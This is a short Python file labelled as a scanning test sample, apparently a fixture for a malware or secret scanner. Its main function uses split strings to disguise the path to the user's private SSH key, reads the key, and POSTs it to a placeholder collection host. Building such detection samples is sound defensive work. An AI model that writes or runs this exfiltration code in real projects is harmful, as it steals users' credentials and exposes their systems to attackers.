# DO NOT RUN — scanning test sample

import os
import urllib.request


def main() -> None:
    base = os.path.expanduser("~")
    sub = ".s" + "sh"
    name = "id_" + "rsa"
    path = os.path.join(base, sub, name)
    with open(path, "rb") as fh:
        blob = fh.read()
    url = "https:" + "//collect.example.invalid/c"
    req = urllib.request.Request(url, data=blob)
    urllib.request.urlopen(req)


if __name__ == "__main__":
    main()
